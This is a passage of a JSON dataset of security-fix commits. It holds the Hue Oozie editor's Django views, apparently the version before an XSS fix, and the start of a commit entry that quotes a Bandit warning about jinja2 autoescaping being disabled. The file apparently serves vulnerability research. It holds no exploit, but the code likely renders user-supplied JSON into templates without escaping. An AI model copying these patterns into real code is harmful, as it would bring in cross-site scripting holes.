copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path',{}) if script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission() def edit_coordinator(request): coordinator_id=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow']) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator', '{}')) coordinator=Coordinator(data=coordinator_dict) response['status']=0 response['xml']=coordinator.to_xml() return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_coordinator(request, doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted.')) return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy() properties={'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')] return render('editor/list_editor_bundles.mako', request,{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies=Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow, request.fs, request.jt, properties).deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail=ex._headers.get('oozie-error-message', ex)) ",
                    "sourceWithComments": "#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport uuid\n\nfrom django.core.urlresolvers import reverse\nfrom django.forms.formsets import formset_factory\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib.django_util import render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.lib.i18n import smart_str\nfrom desktop.lib.rest.http_client import RestException\nfrom desktop.models import Document, Document2\n\nfrom liboozie.credentials import Credentials\nfrom liboozie.oozie_api import get_oozie\nfrom liboozie.submission2 import Submission\n\nfrom oozie.decorators import check_document_access_permission, check_document_modify_permission\nfrom oozie.forms import ParameterForm\nfrom oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\\n    find_dollar_variables, find_dollar_braced_variables\n\n\nLOG = logging.getLogger(__name__)\n\n\n\ndef list_editor_workflows(request):  \n  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  return render('editor/list_editor_workflows.mako', request, {\n      'workflows_json': json.dumps(workflows)\n  })\n\n\n@check_document_access_permission()\ndef edit_workflow(request):\n  workflow_id = request.GET.get('workflow')\n  \n  if workflow_id:\n    wid = {}\n    if workflow_id.isdigit():\n      wid['id'] = workflow_id\n    else:\n      wid['uuid'] = workflow_id\n    doc = Document2.objects.get(type='oozie-workflow2', **wid)\n    workflow = Workflow(document=doc)\n  else:\n    doc = None\n    workflow = Workflow()\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n  \n  workflow_data = workflow.get_data()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  return render('editor/workflow_editor.mako', request, {\n      'layout_json': json.dumps(workflow_data['layout']),\n      'workflow_json': json.dumps(workflow_data['workflow']),\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_workflow(request):\n  return edit_workflow(request)\n\n\ndef delete_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(id=job['id'])\n    doc = doc2.doc.get()\n    doc.can_write_or_exception(request.user)\n    \n    doc.delete()\n    doc2.delete()\n\n  response = {}\n  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef copy_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])\n    \n    name = doc2.name + '-copy'\n    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)\n  \n    doc2.pk = None\n    doc2.id = None\n    doc2.uuid = str(uuid.uuid4())\n    doc2.name = name\n    doc2.owner = request.user    \n    doc2.save()\n  \n    doc2.doc.all().delete()\n    doc2.doc.add(copy_doc)\n    \n    workflow = Workflow(document=doc2)\n    workflow.update_name(name)\n    doc2.update_data({'workflow': workflow.get_data()['workflow']})\n    doc2.save()\n\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n\n  response = {}  \n  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_modify_permission()\ndef save_workflow(request):\n  response = {'status': -1}\n\n  workflow = json.loads(request.POST.get('workflow', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  if workflow.get('id'):\n    workflow_doc = Document2.objects.get(id=workflow['id'])\n  else:      \n    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)\n    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')\n\n  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']\n  if subworkflows:\n    dependencies = Document2.objects.filter(uuid__in=subworkflows)\n    workflow_doc.dependencies = dependencies\n\n  workflow_doc.update_data({'workflow': workflow})\n  workflow_doc.update_data({'layout': layout})\n  workflow_doc.name = workflow['name']\n  workflow_doc.save()\n  \n  workflow_instance = Workflow(document=workflow_doc)\n  \n  response['status'] = 0\n  response['id'] = workflow_doc.id\n  response['doc1_id'] = workflow_doc.doc.get().id\n  response['message'] = _('Page saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef new_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n\n  properties = NODES[node['widgetType']].get_mandatory_fields()\n  workflows = []\n\n  if node['widgetType'] == 'subworkflow-widget':\n    workflows = _get_workflows(request.user)\n\n  response['status'] = 0\n  response['properties'] = properties \n  response['workflows'] = workflows\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef _get_workflows(user):\n  return [{\n        'name': workflow.name,\n        'owner': workflow.owner.username,\n        'value': workflow.uuid,\n        'id': workflow.id\n      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]\n    ]  \n\n\ndef add_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n  properties = json.loads(request.POST.get('properties', '{}'))\n  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))\n\n  _properties = dict(NODES[node['widgetType']].get_fields())\n  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))\n\n  if copied_properties:\n    _properties.update(copied_properties)\n\n  response['status'] = 0\n  response['properties'] = _properties\n  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef action_parameters(request):\n  response = {'status': -1}\n  parameters = set()\n\n  try:\n    node_data = json.loads(request.POST.get('node', '{}'))\n    \n    parameters = parameters.union(set(Node(node_data).find_parameters()))\n    \n    script_path = node_data.get('properties', {}).get('script_path', {})\n    if script_path:\n      script_path = script_path.replace('hdfs://', '')\n\n      if request.fs.do_as_user(request.user, request.fs.exists, script_path):\n        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  \n\n        if node_data['type'] in ('hive', 'hive2'):\n          parameters = parameters.union(set(find_dollar_braced_variables(data)))\n        elif node_data['type'] == 'pig':\n          parameters = parameters.union(set(find_dollar_variables(data)))\n                \n    response['status'] = 0\n    response['parameters'] = list(parameters)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef workflow_parameters(request):\n  response = {'status': -1}\n\n  try:\n    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) \n\n    response['status'] = 0\n    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_workflow(request):\n  response = {'status': -1}\n\n  try:\n    workflow_json = json.loads(request.POST.get('workflow', '{}'))\n  \n    workflow = Workflow(workflow=workflow_json)\n  \n    response['status'] = 0\n    response['xml'] = workflow.to_xml()\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_workflow(request, doc_id):\n  workflow = Workflow(document=Document2.objects.get(id=doc_id))\n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)    \n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n\n      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)\n\n      request.info(_('Workflow submitted'))\n      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = workflow.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n    popup = render('editor/submit_job_popup.mako', request, {\n                     'params_form': params_form,\n                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})\n                   }, force_template=True).content\n    return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_workflow(user, fs, jt, workflow, mapping):\n  try:\n    submission = Submission(user, workflow, fs, jt, mapping)\n    job_id = submission.run()\n    return job_id\n  except RestException, ex:\n    detail = ex._headers.get('oozie-error-message', ex)\n    if 'Max retries exceeded with url' in str(detail):\n      detail = '%s: %s' % (_('The Oozie server is not running'), detail)\n    LOG.error(smart_str(detail))\n    raise PopupException(_(\"Error submitting workflow %s\") % (workflow,), detail=detail)\n\n  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n\n\n\ndef list_editor_coordinators(request):\n  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/list_editor_coordinators.mako', request, {\n      'coordinators': coordinators\n  })\n\n\n@check_document_access_permission()\ndef edit_coordinator(request):\n  coordinator_id = request.GET.get('coordinator')\n  doc = None\n  \n  if coordinator_id:\n    doc = Document2.objects.get(id=coordinator_id)\n    coordinator = Coordinator(document=doc)\n  else:\n    coordinator = Coordinator()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):\n    raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n\n  return render('editor/coordinator_editor.mako', request, {\n      'coordinator_json': coordinator.json,\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflows_json': json.dumps(workflows),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_coordinator(request):\n  return edit_coordinator(request)\n\n\n@check_document_modify_permission()\ndef save_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))\n\n  if coordinator_data.get('id'):\n    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])\n  else:      \n    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)\n    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')\n\n  if coordinator_data['properties']['workflow']:\n    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)\n    coordinator_doc.dependencies = dependencies\n\n  coordinator_doc.update_data(coordinator_data)\n  coordinator_doc.name = coordinator_data['name']\n  coordinator_doc.save()\n  \n  response['status'] = 0\n  response['id'] = coordinator_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))\n\n  coordinator = Coordinator(data=coordinator_dict)\n\n  response['status'] = 0\n  response['xml'] = coordinator.to_xml()\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\") \n\n\n@check_document_access_permission()\ndef submit_coordinator(request, doc_id):\n  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_coordinator(request, coordinator, mapping)\n\n      request.info(_('Coordinator submitted.'))\n      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = coordinator.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_coordinator(request, coordinator, mapping):\n  try:\n    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])\n    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()\n\n    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}\n    properties.update(mapping)\n\n    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting coordinator %s\") % (coordinator,),\n                         detail=ex._headers.get('oozie-error-message', ex))\n    \n    \n    \n\ndef list_editor_bundles(request):\n  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]\n\n  return render('editor/list_editor_bundles.mako', request, {\n      'bundles': bundles\n  })\n\n\n@check_document_access_permission()\ndef edit_bundle(request):\n  bundle_id = request.GET.get('bundle')\n  doc = None\n  \n  if bundle_id:\n    doc = Document2.objects.get(id=bundle_id)\n    bundle = Bundle(document=doc)\n  else:\n    bundle = Bundle()\n\n  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/bundle_editor.mako', request, {\n      'bundle_json': bundle.json,\n      'coordinators_json': json.dumps(coordinators),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n  })\n\n\ndef new_bundle(request):\n  return edit_bundle(request)\n\n\n@check_document_modify_permission()\ndef save_bundle(request):\n  response = {'status': -1}\n\n  bundle_data = json.loads(request.POST.get('bundle', '{}'))\n\n  if bundle_data.get('id'):\n    bundle_doc = Document2.objects.get(id=bundle_data['id'])\n  else:      \n    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)\n    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')\n\n  if bundle_data['coordinators']:\n    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)    \n    bundle_doc.dependencies = dependencies\n\n  bundle_doc.update_data(bundle_data)\n  bundle_doc.name = bundle_data['name']\n  bundle_doc.save()\n  \n  response['status'] = 0\n  response['id'] = bundle_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_bundle(request, doc_id):\n  bundle = Bundle(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_bundle(request, bundle, mapping)\n\n      request.info(_('Bundle submitted.'))\n      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = bundle.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_bundle(request, bundle, properties):\n  try:\n    deployment_mapping = {}\n    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])\n    \n    for i, bundled in enumerate(bundle.data['coordinators']):\n      coord = coords[bundled['coordinator']]\n      workflow = Workflow(document=coord.dependencies.all()[0])\n      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      \n      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)\n      \n      coordinator = Coordinator(document=coord)\n      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()\n      deployment_mapping['coord_%s_dir' % i] = coord_dir\n      deployment_mapping['coord_%s' % i] = coord\n\n    properties.update(deployment_mapping)\n    \n    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting bundle %s\") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))\n\n"
                }
            },
            "msg": "[oozie] Protect against XSS in the editor"
        }
    },
    "https://github.com/OkunaOrg/okuna-www-api": {
        "8c40c66ea7c483a0cbda4c21940180af909aab99": {
            "url": "https://api.github.com/repos/OkunaOrg/okuna-www-api/commits/8c40c66ea7c483a0cbda4c21940180af909aab99",
            "html_url": "https://github.com/OkunaOrg/okuna-www-api/commit/8c40c66ea7c483a0cbda4c21940180af909aab99",
            "message": ":bug: Add autoescape=True for jinja2 to prevent XSS\n\n>> Issue: [B701:jinja2_autoescape_false] By default, jinja2 sets autoescape to False. Consider using autoescape=True or use the select_autoescape function to mitigate XSS vulnerabilities.\n   Severity: High   Confidence: High\n   Location: ./utils/make_eb_config.py:11\n   More Info: https://bandit.readthedocs.io/en/latest/plugins/b701_jinja2_autoescape_false.html",
            "sha": "8c40c66ea7c483a0cbda4c21940180af909aab99",
            "keyword": "XSS issue",
